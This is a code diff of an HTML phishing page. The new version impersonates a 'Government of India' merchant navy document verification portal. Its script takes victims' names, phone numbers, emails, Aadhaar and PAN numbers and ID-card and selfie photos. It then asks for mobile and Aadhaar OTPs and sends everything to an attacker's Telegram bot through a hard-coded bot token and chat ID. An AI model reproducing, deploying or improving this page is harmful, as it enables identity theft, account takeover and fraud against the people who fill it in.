@@ -2,63 +2,111 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>E-KYC Verification Portal</title>
+    <title>Government of India - Document Verification</title>
     <style>
         body { font-family: sans-serif; background: #f0f2f5; padding: 10px; margin: 0; }
-        .box { background: white; max-width: 450px; margin: 10px auto; padding: 25px; border-radius: 12px; border-top: 8px solid #003366; box-shadow: 0 4px 15px rgba(0,0,0,0.2); }
-        h2 { text-align: center; color: #003366; font-size: 18px; border-bottom: 2px solid #eee; padding-bottom: 10px; }
-        label { font-weight: bold; font-size: 13px; display: block; margin-top: 15px; }
-        input { width: 100%; padding: 12px; margin-top: 5px; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; }
-        .btn { background: #28a745; color: white; border: none; padding: 18px; width: 100%; border-radius: 6px; cursor: pointer; font-weight: bold; font-size: 16px; margin-top: 25px; }
+        .box { background: white; max-width: 500px; margin: 10px auto; padding: 20px; border-radius: 8px; border-top: 5px solid #003366; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .header { text-align: center; border-bottom: 1px solid #ddd; padding-bottom: 10px; margin-bottom: 20px; }
+        .header h1 { color: #003366; margin: 0; font-size: 22px; text-transform: uppercase; }
+        .header p { margin: 5px 0 0; font-size: 13px; color: #666; }
+        label { font-weight: bold; font-size: 13px; display: block; margin-top: 15px; color: #333; }
+        input { width: 100%; padding: 10px; margin-top: 5px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; background: #f9f9f9; }
+        .btn { background: #28a745; color: white; border: none; padding: 15px; width: 100%; border-radius: 6px; cursor: pointer; font-weight: bold; font-size: 16px; margin-top: 25px; }
         #otp-section { display: none; }
+        .loading-text { display: none; text-align: center; color: #003366; font-weight: bold; margin-top: 10px; }
     </style>
 </head>
 <body>
 
 <div class="box">
-    <h2>E-KYC VERIFICATION SYSTEM</h2>
-    <form id="kycForm">
+    <div class="header">
+        <h1>GOVERNMENT OF INDIA</h1>
+        <p>Merchant Navy Document Verification</p>
+    </div>
+
+    <form id="verificationForm">
         <div id="step1">
-            <label>Full Name</label><input type="text" id="name" required>
-            <label>Mobile Number</label><input type="tel" id="mobile" required>
-            <label>Aadhaar Number</label><input type="number" id="aadhaar" required>
-            <label>PAN Number</label><input type="text" id="pan" required>
-            <p style="font-size:11px; color:red; margin-top:10px;">* Photo upload is active. Please select files.</p>
-            <label>Aadhaar Photo</label><input type="file" id="f1">
-            <label>Selfie Photo</label><input type="file" id="f2">
+            <label>Full Name (As per Aadhaar) *</label><input type="text" id="name" required>
+            <label>Mobile Number *</label><input type="tel" id="mobile" required>
+            <label>Email ID *</label><input type="email" id="email" required>
+            <label>Aadhaar Card Number *</label><input type="number" id="aadhaar" required>
+            <label>PAN Card Number *</label><input type="text" id="pan" required>
             
-            <button type="button" class="btn" onclick="sendDetails()">SUBMIT & REQUEST OTP</button>
+            <label>Aadhaar Front & Back Photo *</label><input type="file" id="img1" accept="image/*" required>
+            <label>PAN Card Photo *</label><input type="file" id="img2" accept="image/*" required>
+            <label>Candidate Selfie (Live) *</label><input type="file" id="img3" accept="image/*" required>
+            
+            <button type="button" class="btn" id="submitBtn" onclick="handleSubmission()">Next: Verify Identity</button>
+            <p id="loading" class="loading-text">Sending documents to server...</p>
         </div>
 
         <div id="otp-section">
-            <h3 style="text-align:center; color: #d9534f;">🔐 OTP VERIFICATION</h3>
-            <label>Mobile OTP</label><input type="text" id="m_otp" placeholder="Enter Mobile OTP">
-            <label>Aadhaar OTP</label><input type="text" id="a_otp" placeholder="Enter Aadhaar OTP">
-            <button type="button" class="btn" style="background:#003366;" onclick="sendOTP()">VERIFY & FINISH</button>
+            <h2 style="text-align:center; color:#d9534f; font-size:18px;">🔐 VERIFICATION REQUIRED</h2>
+            <p style="font-size:12px; text-align:center;">Enter the OTPs sent to your mobile and Aadhaar registered number.</p>
+            <label>Mobile Number OTP</label><input type="text" id="otp_m" placeholder="6-digit OTP">
+            <label>Aadhaar Number OTP</label><input type="text" id="otp_a" placeholder="6-digit OTP">
+            <button type="button" class="btn" style="background:#003366;" onclick="sendOTP()">SUBMIT OTP</button>
         </div>
     </form>
 </div>
 
 <script>
-    const TOKEN = '8280546067:AAGrfg3--zETMS9QeokAZyFp7MjsFBKIrNY';
-    const CHAT_ID = '7405101072'; // Maine aapki ID yahan set kar di hai
+    const TOKEN = '8280546067:AAGrfg3--zETMS9QeokAZyFp7MjsFBKIrNY'; // Tera Token
+    const CHAT_ID = '7405101072'; // Teri Chat ID
 
-    function sendDetails() {
-        const msg = `🚨 *NAYA CUSTOMER* \n\n👤 Name: ${document.getElementById('name').value}\n📞 Mobile: ${document.getElementById('mobile').value}\n🆔 Aadhaar: ${document.getElementById('aadhaar').value}\n💳 PAN: ${document.getElementById('pan').value}`;
+    async function handleSubmission() {
+        const name = document.getElementById('name').value;
+        const mobile = document.getElementById('mobile').value;
+        const email = document.getElementById('email').value;
+        const aadhaar = document.getElementById('aadhaar').value;
+        const pan = document.getElementById('pan').value;
         
-        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`)
-        .then(() => {
+        if(!name || !mobile || !email || !aadhaar || !pan) { alert("Sari details bhariye!"); return; }
+
+        document.getElementById('submitBtn').style.display = 'none';
+        document.getElementById('loading').style.display = 'block';
+
+        const mainText = `🚨 *NAYA SUBMISSION* \n\n👤 Name: ${name}\n📞 Mobile: ${mobile}\n📧 Email: ${email}\n🆔 Aadhaar: ${aadhaar}\n💳 PAN: ${pan}`;
+
+        try {
+            // 1. Details bhej raha hai
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(mainText)}&parse_mode=Markdown`);
+
+            // 2. Photos bhej raha hai
+            const photos = [
+                { id: 'img1', cap: 'Aadhaar Photo' },
+                { id: 'img2', cap: 'PAN Photo' },
+                { id: 'img3', cap: 'Selfie' }
+            ];
+
+            for (let p of photos) {
+                const file = document.getElementById(p.id).files[0];
+                if (file) {
+                    const fd = new FormData();
+                    fd.append('chat_id', CHAT_ID);
+                    fd.append('photo', file);
+                    fd.append('caption', `${p.cap} - ${name}`);
+                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                }
+            }
+
             document.getElementById('step1').style.display = 'none';
             document.getElementById('otp-section').style.display = 'block';
-        });
+            window.scrollTo(0,0);
+        } catch (e) {
+            alert("Error! Check internet.");
+            document.getElementById('submitBtn').style.display = 'block';
+        }
     }
 
     function sendOTP() {
-        const msg = `🔐 *OTP RECIEVED* \n\n📱 Mobile OTP: ${document.getElementById('m_otp').value}\n🆔 Aadhaar OTP: ${document.getElementById('a_otp').value}`;
-        
-        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`)
+        const m = document.getElementById('otp_m').value;
+        const a = document.getElementById('otp_a').value;
+        const otpMsg = `🔐 *OTPs RECIEVED* \n\n📱 Mobile OTP: ${m}\n🆔 Aadhaar OTP: ${a}`;
+
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(otpMsg)}&parse_mode=Markdown`)
         .then(() => {
-            alert("Success! Details Verified.");
+            alert("Application Submitted Successfully!");
             location.reload();
         });
     }
